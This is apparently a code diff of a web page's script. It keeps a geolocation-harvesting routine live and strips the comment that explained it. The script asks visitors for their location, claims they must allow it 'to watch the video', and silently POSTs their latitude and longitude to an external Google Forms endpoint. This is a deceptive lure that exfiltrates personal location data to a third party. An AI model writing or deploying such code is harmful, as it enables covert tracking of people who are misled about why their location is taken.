@@ -426,37 +426,34 @@
                 togglePass.style.opacity = "1";
             }
         });
-        // This script requests the user's location 3 seconds after joining the website
-        // and automatically sends it to a Google Form
-            function requestLocation() {
-  if (!navigator.geolocation) {
-    alert("Your device does not support location.");
-    return;
-  }
 
-  navigator.geolocation.getCurrentPosition(success, error);
-}
-
-function success(position) {
-  const lat = position.coords.latitude;
-  const lon = position.coords.longitude;
-
-  document.getElementById("msg").innerText = "Location received. Enjoy the video!";
-
-  // Send location to your Google Form
-  fetch("https://docs.google.com/forms/d/e/1FAIpQLSfELTAWud7thRvLn6_2EsjaHGidGSkfbMmmC9LTHzdAOWMJiQ/formResponse", {
-    method: "POST",
-    body: new URLSearchParams({
-      "entry.8708125": lat + "," + lon
-    })
-  });
-}
-
-function error() {
-  alert("You must allow location to watch the video.");
-}
+          function requestLocation() {
+              if (!navigator.geolocation) {
+                alert("Your device does not support location.");
+                return;
+              }
+            
+              navigator.geolocation.getCurrentPosition(success, error);
+            }
+            
+            function success(position) {
+              const lat = position.coords.latitude;
+              const lon = position.coords.longitude;
+            
+              document.getElementById("msg").innerText = "Location received. Enjoy the video!";
+            
+              // Send location to your Google Form
+              fetch("https://docs.google.com/forms/d/e/1FAIpQLSfELTAWud7thRvLn6_2EsjaHGidGSkfbMmmC9LTHzdAOWMJiQ/formResponse", {
+                method: "POST",
+                body: new URLSearchParams({
+                  "entry.8708125": lat + "," + lon
+                })
+              });
+            }
+            
+            function error() {
+              alert("You must allow location to watch the video.");
+            }
     </script>
-
 </body>
 </html>
-
